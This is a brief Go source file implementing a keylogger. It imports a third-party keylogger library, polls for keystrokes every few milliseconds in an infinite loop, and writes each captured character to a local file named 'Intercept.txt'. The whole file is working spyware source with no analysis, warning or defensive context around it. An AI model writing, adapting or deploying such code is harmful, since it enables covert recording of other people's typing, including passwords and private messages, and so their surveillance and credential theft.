package main

import (
	"fmt"
	"os"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchMS = 5
)

func main() {
	kl := keylogger.NewKeylogger()

	f, err := os.Create("Intercept.txt")
	if err != nil {
		panic(err)
	}
	defer f.Close()

	for {
		key := kl.GetKey()
		if !key.Empty {
			fmt.Fprintf(f, "%c", key.Rune)
		}
		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
